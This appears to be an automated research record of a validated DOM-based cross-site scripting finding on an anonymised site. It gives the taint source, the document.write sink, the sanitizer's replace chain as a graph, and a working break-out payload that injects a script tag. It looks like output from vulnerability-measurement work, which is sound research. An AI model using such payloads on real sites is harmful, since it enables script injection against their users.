// Finding: 5cfd26d1-8740-4de0-8c45-fd9d54dc711e
// Finding.url: https://www.example395.com/programmes/frank-of-ireland##"></iframe></style></script></object></embed></textarea><script>taintfoxLog('45641f7afc4b45b4a42063b17ed1ccc6')</script><!--/*
// Finding.parentloc: https://www.example395.com/programmes/frank-of-ireland##"></iframe></style></script></object></embed></textarea><script>taintfoxLog('45641f7afc4b45b4a42063b17ed1ccc6')</script><!--/*
// Finding.domain: www.example395.com
// Finding.base_domain: example395.com
// Finding.source: location.href
// Finding.sink: document.write
// Sanitizer.score: 1
// Sanitizer.name: getTargetPath
// Sanitizer.location: https://static.example396.com/all4-ad-code/latest/adverts.js - getTargetPath:1:11639
// Finding.begin: 95
// Finding.end: 123
// Finding.original_uuid: f3fecbfa-7dc1-4900-b50a-c6e760d6d040
// Finding.TwentyFiveMillionFlowsId: 1319740964
// Finding.script: https://www.example395.com/programmes/frank-of-ireland##"></iframe></style></script></object></embed></textarea><script>taintfoxLog('45641f7afc4b45b4a42063b17ed1ccc6')</script><!--/*
// Finding.line: 387
// Exploit.uuid: 45641f7a-fc4b-45b4-a420-63b17ed1ccc6
// Exploit.success: true
// Exploit.status: validated
// Exploit.method: C
// Exploit.type: html
// Exploit.token: attribute
// Exploit.content: src
// Exploit.quote_type: "
// Exploit.tag: script
// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><script>
// Exploit.break_in: </script><!--/*
// Exploit.payload: #"></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
// Exploit.begin_taint_url: 24
// Exploit.end_taint_url: 52
// Exploit.replace_begin_url: 52
// Exploit.replace_end_url: 52
// Exploit.replace_begin_param: 123
// Exploit.replace_end_param: 123
// Issues.LargestEncodeAttrStringChain: 0
// Issues.LargestTextFragmentEncodeChainLength: 0
// Issues.HasApproximation: false
// Issues.HasMissingImplementation: false
// Issues.HasInfiniteRegexWithFunctionReplacer: false
// Issues.MergedSplitAndJoins: false
// Issues.HasUrlInRhsOfReplace: false
// Issues.HasUrlInLhsOfReplace: false
// Issues.HasCookieValueInLhsOfreplace: false
// Issues.HasCookieValueInRhsOfreplace: false
// Issues.HasCookieValueInMatchPattern: false
// Issues.HasCookieValueInExecPattern: false
// Issues.RemovedLRConcats: false
// Issues.RemovedReplaceArtifacts: false
// Issues.HasUrlInMatchPattern: false
// Issues.HasUrlInExecPattern: false
// Issues.RemovedNOPreplaces: true
// Issues.Known_sanitizer: false
// DepGraph.hash: -1640204059
// DepGraph.sanitizer_hash: -1898202251
// Removed NOP replaces 
digraph cfg {
n0 [shape=house, label="Input: x"];
n1 [shape=ellipse, label="str_replace_once"];
n2 [shape=box, label="Lit: #"];
n3 [shape=box, label="Lit: /"];
n4 [shape=box, label="Var: x"];
n5 [shape=ellipse, label="str_replace_once"];
n6 [shape=box, label="RegExp: /https?:\/\//"];
n7 [shape=box, label="Lit: "];
n8 [shape=box, label="Var: x"];
n9 [shape=ellipse, label="preg_replace"];
n10 [shape=box, label="RegExp: /\+/"];
n11 [shape=box, label="Lit: -"];
n12 [shape=box, label="Var: x"];
n13 [shape=ellipse, label="preg_replace"];
n14 [shape=box, label="RegExp: /[&]/"];
n15 [shape=box, label="Lit: -"];
n16 [shape=box, label="Var: x"];
n17 [shape=box, label="Var: x"];
n18 [shape=doubleoctagon, label="Return: x"];
n4 -> n0;
n1 -> n2;
n1 -> n3;
n1 -> n4;
n8 -> n1;
n5 -> n6;
n5 -> n7;
n5 -> n8;
n12 -> n5;
n9 -> n10;
n9 -> n11;
n9 -> n12;
n16 -> n9;
n13 -> n14;
n13 -> n15;
n13 -> n16;
n17 -> n13;
n18 -> n17;
}